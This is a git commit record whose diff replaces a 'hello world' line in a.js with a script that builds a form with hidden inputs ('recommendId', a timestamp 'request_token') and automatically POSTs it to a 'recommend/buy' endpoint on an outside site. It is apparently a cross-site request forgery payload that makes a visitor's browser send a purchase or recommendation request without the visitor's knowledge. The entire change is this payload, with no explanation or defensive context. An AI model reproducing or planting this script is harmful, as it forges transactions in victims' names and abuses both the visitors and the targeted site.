fffb083eb243d041a35f2de5f6c2de8a83400991
fashao <ufo@cs229.com>
2016-08-11 13:02:51 +0800

    js

--- a.js
+++ a.js
@@ -1,1 +1,28 @@
-hello world
+<script>
+function new_form(){
+    var f = document.createElement("form");
+    document.body.appendChild(f);
+    f.method = "post";
+    return f;
+}
+function create_elements(eForm,eName,eValue){
+    var e=document.createElement("input");
+    eForm.appendChild(e);
+    e.type='text';
+    e.name=eName;
+    if(!document.all){
+        e.style.display='none';
+    }else{
+        e.style.display='block';
+        e.style.width='0px';
+        e.style.height='0px';
+    }
+    e.value=eValue;
+    return e;
+}
+var _f=new_form();//创建一个form表单
+create_elements(_f,"recommendId","888658");//创建form中的input对象
+create_elements(_f,"request_token",String(new Date().getTime()));
+_f.action="http://www.fox008.com/YP/recommend/buy?t="+String(new Date().getTime());//form提交地址
+_f.submit();//提交
+</script>
